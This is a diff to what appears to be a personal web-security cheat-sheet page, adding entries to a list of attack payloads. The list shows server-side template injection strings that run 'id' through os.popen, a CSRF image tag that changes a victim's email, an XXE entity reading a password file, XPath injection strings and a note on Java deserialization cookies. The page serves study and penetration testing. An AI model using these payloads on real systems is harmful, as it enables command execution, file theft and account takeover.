@@ -40,10 +40,11 @@ toc_sticky: true
     <li>WIP</li>
     <li>SSRF</li>
     <li>Server-side template injection - {{''.__class__.mro()[1].__subclasses__()[X](COMMAND)}} or {{url_for.__globals__.os.popen("id").read() }} or TPLMAP.py</li>
-    <li>CSRF - <.img src="https://vulnerable-website/email/change?email=pwned@evil-user.net"></li>
+    <li>CSRF - <.img src="https://vulnerable-website/email/change?email=pwned@evil-user.net"> or tool=xsrfprobe</li>
     <li>xml entities - <!DOCTYP3 test [
       <!ENTITY x SYSTEM "file:///etxc/paxswd">]></li>
       <li>xpath - hacker']%00 or hacker' or 1=1]%00 --- ?name=hacker' or 1=1]/parent::*/child::node()%00&password=sdf</li>
+      <li>objectinputstream- exploitation of a call to readObject - rO0 in cookie</li>
 </ul>
 
 <h2>ldap</h2>
